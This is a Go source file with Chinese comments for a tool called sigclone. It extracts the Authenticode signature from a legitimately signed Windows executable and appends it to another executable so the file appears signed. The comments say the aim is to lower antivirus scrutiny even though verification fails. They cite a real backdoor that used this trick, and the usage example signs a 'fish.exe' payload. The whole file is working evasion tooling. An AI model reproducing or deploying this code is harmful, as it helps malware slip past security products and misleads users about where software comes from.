// sigclone.go — Authenticode签名移植工具
// 从合法PE文件提取Authenticode签名 (PKCS#7 blob) 并移植到目标PE文件
// 使目标PE在Windows属性中显示"Digital Signatures"标签页
// 注意: 签名验证会失败 (签名与文件哈希不匹配)，但很多AV对签名二进制降低审查级别
//
// 参考: Mangle (github.com/optiv/Mangle) 的Go版实现
// 真实案例: Gsb后门用glass.com的签名，VT检出仅15.8%

package main

import (
	"encoding/binary"
	"fmt"
	"os"
)

func main() {
	if len(os.Args) < 4 {
		fmt.Println("用法: sigclone <源PE(有签名)> <目标PE> <输出PE>")
		fmt.Println("例:   sigclone UniKeyNT.exe fish.exe fish_signed.exe")
		os.Exit(1)
	}

	srcPath := os.Args[1]
	targetPath := os.Args[2]
	outPath := os.Args[3]

	// 1. 从源PE提取签名blob
	sigBlob, certTableOffset, err := extractSignature(srcPath)
	if err != nil {
		fmt.Printf("[!] 提取签名失败: %v\n", err)
		os.Exit(1)
	}
	if len(sigBlob) == 0 {
		fmt.Println("[!] 源PE没有Authenticode签名")
		os.Exit(1)
	}
	fmt.Printf("[+] 提取签名: %d字节 (cert table at offset 0x%X)\n", len(sigBlob), certTableOffset)

	// 2. 读取目标PE
	targetData, err := os.ReadFile(targetPath)
	if err != nil {
		fmt.Printf("[!] 读取目标PE失败: %v\n", err)
		os.Exit(1)
	}

	// 3. 修改目标PE的Security Directory指向新的签名
	outData, err := injectSignature(targetData, sigBlob)
	if err != nil {
		fmt.Printf("[!] 注入签名失败: %v\n", err)
		os.Exit(1)
	}

	// 4. 写入输出文件
	err = os.WriteFile(outPath, outData, 0644)
	if err != nil {
		fmt.Printf("[!] 写入输出失败: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[+] 签名移植完成: %s (%d字节)\n", outPath, len(outData))
	fmt.Println("[+] Windows属性中将显示签名信息 (验证会失败，但AV审查级别降低)")
}

// extractSignature 从PE文件提取Authenticode签名blob
func extractSignature(path string) ([]byte, uint32, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, 0, err
	}

	// PE结构解析
	if len(data) < 64 {
		return nil, 0, fmt.Errorf("文件太小")
	}

	// DOS header
	if binary.LittleEndian.Uint16(data[0:]) != 0x5A4D {
		return nil, 0, fmt.Errorf("不是PE文件 (无MZ签名)")
	}

	eLfanew := binary.LittleEndian.Uint32(data[0x3C:])
	if eLfanew+24 > uint32(len(data)) {
		return nil, 0, fmt.Errorf("PE header超出范围")
	}

	// PE signature
	if binary.LittleEndian.Uint32(data[eLfanew:]) != 0x4550 {
		return nil, 0, fmt.Errorf("不是PE文件 (无PE\\0\\0签名)")
	}

	// Optional Header偏移: eLfanew + 0x18
	optHdrOffset := eLfanew + 0x18

	// Magic (PE32 vs PE32+)
	magic := binary.LittleEndian.Uint16(data[optHdrOffset:])
	var dataDirOffset uint32
	if magic == 0x20B { // PE32+ (amd64)
		dataDirOffset = optHdrOffset + 112 // 0x70
	} else if magic == 0x10B { // PE32
		dataDirOffset = optHdrOffset + 96 // 0x60
	} else {
		return nil, 0, fmt.Errorf("unknown PE magic: 0x%X", magic)
	}

	// Security Directory (第5个DataDirectory, index=4)
	// layout: VirtualAddress(4) + Size(4)
	secDirOffset := dataDirOffset + 4*8 // 每个DataDirectory占8字节
	if secDirOffset+8 > uint32(len(data)) {
		return nil, 0, fmt.Errorf("Security Directory超出范围")
	}

	sigRVA := binary.LittleEndian.Uint32(data[secDirOffset:])
	sigSize := binary.LittleEndian.Uint32(data[secDirOffset+4:])

	if sigRVA == 0 || sigSize == 0 {
		return nil, 0, nil // 没有签名
	}

	// Authenticode签名存储在文件末尾 (不是内存RVA, 是文件偏移)
	// 对于签名, VirtualAddress = 文件偏移 (不是内存地址)
	sigOffset := sigRVA
	if sigOffset+sigSize > uint32(len(data)) {
		return nil, 0, fmt.Errorf("签名数据超出文件范围")
	}

	return data[sigOffset : sigOffset+sigSize], secDirOffset, nil
}

// injectSignature 将签名blob注入目标PE
func injectSignature(targetData []byte, sigBlob []byte) ([]byte, error) {
	if len(targetData) < 64 {
		return nil, fmt.Errorf("目标文件太小")
	}

	// 复制目标数据 (避免修改原数据)
	outData := make([]byte, len(targetData)+len(sigBlob))
	copy(outData, targetData)
	copy(outData[len(targetData):], sigBlob)

	// 解析PE结构
	eLfanew := binary.LittleEndian.Uint32(outData[0x3C:])
	optHdrOffset := eLfanew + 0x18
	magic := binary.LittleEndian.Uint16(outData[optHdrOffset:])

	var dataDirOffset uint32
	if magic == 0x20B { // PE32+
		dataDirOffset = optHdrOffset + 112
	} else { // PE32
		dataDirOffset = optHdrOffset + 96
	}

	// Security Directory (index=4)
	secDirOffset := dataDirOffset + 4*8

	// 设置签名偏移 = 文件原始大小 (签名附加在末尾)
	sigFileOffset := uint32(len(targetData))

	// 写入Security Directory
	binary.LittleEndian.PutUint32(outData[secDirOffset:], sigFileOffset)
	binary.LittleEndian.PutUint32(outData[secDirOffset+4:], uint32(len(sigBlob)))

	return outData, nil
}
